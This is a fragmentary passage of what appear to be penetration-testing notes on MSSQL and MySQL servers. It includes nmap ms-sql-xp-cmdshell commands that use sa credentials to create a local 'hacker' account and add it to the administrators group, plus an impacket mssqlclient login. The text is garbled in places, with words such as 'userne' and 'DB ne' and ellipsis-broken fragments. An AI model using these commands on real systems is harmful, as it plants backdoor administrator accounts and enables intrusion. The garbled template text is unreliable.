...
Connect manually:
```
mysql -u {userne} -p'{password}' \
    -h {remote server ip or ne} -P {port} \
    -D {DB ne}
```
For example
```
...
what account you scanned the sql machines with

what machines were in the result of that scan

what account you used to test that connection afterward
...
```
$ nmap x.x.x.x -p 1433 -sV --script=ms-sql-xp-cmdshell.nse --script-args mssql.userne=sa,mssql.password=poiuytrewq,ms-sql-xp-cmdshell.cmd='net user hacker hacker93 /add'
```
  2. Then added user to admin group with same script:
```
$ nmap x.x.x.x -p 1433 -sV --script=ms-sql-xp-cmdshell.nse --script-args mssql.userne=sa,mssql.password=poiuytrewq,ms-sql-xp-cmdshell.cmd='net localgroup administrators hacker /add'
```
...
```
$ /opt/impacket-0.9.21/examples > mssqlclient.py userne@x.x.x.x
```
